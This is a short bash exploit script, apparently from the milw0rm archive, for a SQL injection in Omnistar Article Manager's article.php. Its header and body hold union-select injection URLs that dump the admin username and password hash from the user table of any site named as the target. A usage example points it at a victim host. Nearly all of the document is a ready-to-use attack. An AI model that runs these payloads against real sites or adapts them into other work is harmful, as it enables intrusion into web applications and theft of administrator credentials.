#/bin/bash



####################################################################################################################

#                                                                                                                  #

#                 Omnistar Article Manager Software (article.php) Remote SQL Injection Exploit                     #

#                                                                                                                  #

#                                       Exploit Coded By : Cold z3ro                                               #

#                                                                                                                  #

#                                            http://Hackteach.org                                                  #

#                                                                                                                  #

#                                                                                                                  #

# Exploit : /article.php?op=favorite&article_id=4&page_id=-1'/**/union/**/select/**/name,1/**/from/**/user/*       #

#           /article.php?op=favorite&article_id=4&page_id=-1'/**/union/**/select/**/password,1/**/from/**/user/*   #

#                                                                                                                  #

# Example : http://demo.hostcontroladmin.com/demo_press2/articles/                                                 #

#                                                                                                                  #

####################################################################################################################



URL=$1;

PATH="$2/";



echo -e "\n";

echo -e "\n";

echo -e "######################################################################################"

echo -e "#   Omnistar Article Manager Software (article.php) Remote SQL Injection Exploit     #"

echo -e "#                           Exploit Coded By By : Cold z3ro                          #"

echo -e "#                                 http://Hackteach.org                               #"

echo -e "######################################################################################"



if [ "$URL" = "" ]; then

	echo -e "\n USAGE: $0 [URL] [NukePath]"

	echo -e " Example: $0 www.victim.net NukePath\n" 

	exit

fi;



if [ $PATH = "/" ]; then PATH=""; fi;



name_query_url="http://$URL/$PATH""article.php?op=favorite&article_id=4&page_id=-1'/**/union/**/select/**/name,1/**/from/**/user/*";



password_query_url="http://$URL/$PATH""article.php?op=favorite&article_id=4&page_id=-1'/**/union/**/select/**/password,1/**/from/**/user/*";



echo -e "\n";

echo -e "\n";

echo -e "Direct Query URL For Admin name: \n";

echo -e ""$name_query_url"\n";

echo -e "\n";

echo -e "Direct Query URL For Admin Hash:\n";

echo -e ""$password_query_url"\n";

# milw0rm.com [2007-09-16]
